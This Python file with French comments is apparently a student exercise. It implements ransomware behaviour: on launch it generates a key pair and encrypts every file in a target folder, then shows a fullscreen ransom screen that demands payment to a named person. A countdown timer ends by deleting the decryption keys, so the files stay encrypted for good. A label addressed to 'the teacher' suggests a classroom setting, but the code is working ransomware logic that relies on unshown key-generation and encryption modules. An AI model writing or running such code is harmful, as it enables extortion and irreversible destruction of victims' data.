import tkinter as tk
from tkinter import messagebox
import os
import keygen
import encrypt
import decrypt
from variable import *

#Création d'une fonction permettant de récupérer le chemin complet du répertoire cible
def list_full_paths(directory):
    fullPath = [os.path.join(directory, file) for file in os.listdir(directory)]
    return fullPath
    

#Définition de la fonction permettant de chiffrer tous les fichiers du répertoire cible
def encryptFolder():
    for j in list_full_paths(folderToEncrypt):
        encrypt.encrypt(j, publicKey)

#Définition de la fonction permettant de déchiffrer tous les fichiers du répertoire cible
def decryptFolder():
    for k in list_full_paths(folderToEncrypt):
        decrypt.decrypt(k, privateKey)        

#Définition de la fonction permettant de générer un timer
def countdown(count):
    hour,minute,second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] ='{}:{}:{}'.format(hour, minute, second)

    if second >= 0 or minute > 0 or hour > 0:
        if second > 0:
            second -= 1
            root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
        elif minute > 0:
            minute -= 1
            second = 59
            root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
            root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
        elif second == 0 and minute == 0 and hour == 0: 
            button.destroy()
            os.remove(privateKey)
            os.remove(publicKey)
            buttonQuit.pack()
            
#Génération d'une paire de clés et chiffrement des fichiers du répertoire cible
keygen.generate_pair()    
encryptFolder()

#Création de la fenêtre TkInter et des éléments la composant
root = tk.Tk()
root.title("You've been pwned !")
root.attributes('-fullscreen', True)
root.resizable(False, False)
label1 = tk.Label(root, text='Vous vous êtes fait pirater !', font=('calibri', 30, 'bold'))
label1.pack()
label2 = tk.Label(root, text='Suppression des clés de chiffrement dans:', font=('calibri', 25, 'bold'))
label2.pack()
label = tk.Label(root,font =('calibri', 50, 'bold'), fg='white',bg='blue')
label.pack()
label3 = tk.Label(root, text="Pour déchiffrer vos données, envoyez de l'argent à François Brille et cliquez sur \"Déchiffrer\"", font=('calibri', 13, 'bold'))
label3.pack()
button = tk.Button(root, text ='Déchiffrer', command=lambda : [decryptFolder(),root.quit()])
button.pack()
label4 = tk.Label(root, text='Notes pour le prof: Si ce programme est lancé sur votre machine personnelle, cliquez immédiatement sur Déchiffrer:', font=('calibri', 10, 'bold'))
label4.pack()
buttonQuit = tk.Button(root, text= 'Quitter', command=lambda : [print("Bye, enjoy your forever encrypted files"),root.quit()])

#Appel de la fonction et définition de la durée du timer
countdown(timer)

root.mainloop()
